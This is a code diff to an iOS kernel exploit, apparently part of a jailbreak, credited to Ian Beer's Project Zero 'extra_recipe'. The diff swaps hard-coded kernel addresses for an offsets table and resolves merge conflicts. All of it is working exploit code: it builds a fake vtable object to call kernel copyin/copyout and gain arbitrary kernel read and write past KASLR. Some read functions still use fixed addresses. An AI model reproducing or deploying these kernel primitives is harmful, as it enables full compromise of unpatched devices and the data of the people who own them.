@@ -1,5 +1,7 @@
 // This code is lifted from extra_recipe by Ian Beer of Google Project Zero:
 // https://bugs.chromium.org/p/project-zero/issues/detail?id=1004
+
+#include "offsets.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -245,10 +247,10 @@ mach_port_t _lazy_port = 0;
 static void _kx_find()
 {
     uint64_t kernel_base = 0xfffffff007004000 + _kaslr_shift;
-    uint64_t osserializer_serialize = 0xfffffff0074e2efc + _kaslr_shift;
-    uint64_t get_metaclass = 0xFFFFFFF0074C5410 + _kaslr_shift;
+    uint64_t osserializer_serialize = offsets.osserializer_serialize + _kaslr_shift;
+    uint64_t get_metaclass = offsets.metaclass + _kaslr_shift;
     uint64_t ret = get_metaclass + 8;
-    uint64_t copyout = 0xfffffff0071aaa28 + _kaslr_shift;
+    uint64_t copyout = offsets.copyout + _kaslr_shift;
     volatile uint32_t feedfacf = 0;
     
     uint64_t r_obj[64];
@@ -264,7 +266,7 @@ static void _kx_find()
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
     
     r_obj[9] = kernel_base;
-    r_obj[10] = &feedfacf;
+    r_obj[10] = (uint64_t)&feedfacf;
     r_obj[11] = copyout;
     
     memmove((uint8_t *)r_obj + 0x10, r_obj, sizeof(r_obj) - 0x10);
@@ -323,10 +325,10 @@ void kx_setup(io_connect_t *ucs, mach_port_t *lazy_ports, uint64_t kaslr_shift, 
 }
 
 void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
-    uint64_t osserializer_serialize = 0xfffffff0074e2efc + _kaslr_shift;
-    uint64_t get_metaclass = 0xFFFFFFF0074C5410 + _kaslr_shift;
+    uint64_t osserializer_serialize = offsets.osserializer_serialize + _kaslr_shift;
+    uint64_t get_metaclass = offsets.metaclass + _kaslr_shift;
     uint64_t ret = get_metaclass + 8;
-    uint64_t copyout = 0xfffffff0071aaa28 + _kaslr_shift;
+    uint64_t copyout = offsets.copyout + _kaslr_shift;
     
     uint64_t r_obj[64];
     memset(r_obj, 0, sizeof(r_obj));
@@ -356,13 +358,13 @@ void kx3(uint64_t fptr, uint64_t arg0, uint64_t arg1, uint64_t arg2) {
 
 void kread(uint64_t addr, uint8_t *userspace, int n)
 {
-     uint64_t copyout = 0xfffffff0071aaa28 + _kaslr_shift;
-    kx3(copyout, addr, userspace, n);
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
+    kx3(copyout, addr, (uint64_t)userspace, n);
 }
 
 uint32_t kread32(uint64_t addr)
 {
-     uint64_t copyout = 0xfffffff0071aaa28 + _kaslr_shift;
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
     uint32_t value = 0;
     kx3(copyout, addr, (uint64_t)&value, sizeof(value));
     
@@ -371,7 +373,7 @@ uint32_t kread32(uint64_t addr)
 
 uint64_t kread64(uint64_t addr)
 {
-     uint64_t copyout = 0xfffffff0071aaa28 + _kaslr_shift;
+    uint64_t copyout = 0xfffffff0071f5280 + _kaslr_shift;
     uint64_t value = 0;
     kx3(copyout, addr, (uint64_t)&value, sizeof(value));
     
@@ -380,33 +382,18 @@ uint64_t kread64(uint64_t addr)
 
 void kwrite(uint64_t addr, uint8_t *userspace, int n)
 {
-<<<<<<< HEAD
-    uint64_t copyin = 0xfffffff0071aa804 + _kaslr_shift;
-    kx3(copyin, addr, userspace, n);
-=======
     uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
-    kx3(copyin, userspace, addr, n);
->>>>>>> potmdehex/master
+    kx3(copyin, (uint64_t)userspace, addr, n);
 }
 
 void kwrite32(uint64_t addr, uint32_t value)
 {
-<<<<<<< HEAD
-    uint64_t copyin = 0xfffffff0071aa804 + _kaslr_shift;
-    kx3(copyin, addr, &value, sizeof(value));
-=======
     uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
-    kx3(copyin, &value, addr, sizeof(value));
->>>>>>> potmdehex/master
+    kx3(copyin, (uint64_t)&value, addr, sizeof(value));
 }
 
 void kwrite64(uint64_t addr, uint64_t value)
 {
-<<<<<<< HEAD
-    uint64_t copyin = 0xfffffff0071aa804+ _kaslr_shift;
-    kx3(copyin, addr, &value, sizeof(value));
-=======
     uint64_t copyin = 0xfffffff0071f5058 + _kaslr_shift;
-    kx3(copyin, &value, addr, sizeof(value));
->>>>>>> potmdehex/master
+    kx3(copyin, (uint64_t)&value, addr, sizeof(value));
 }
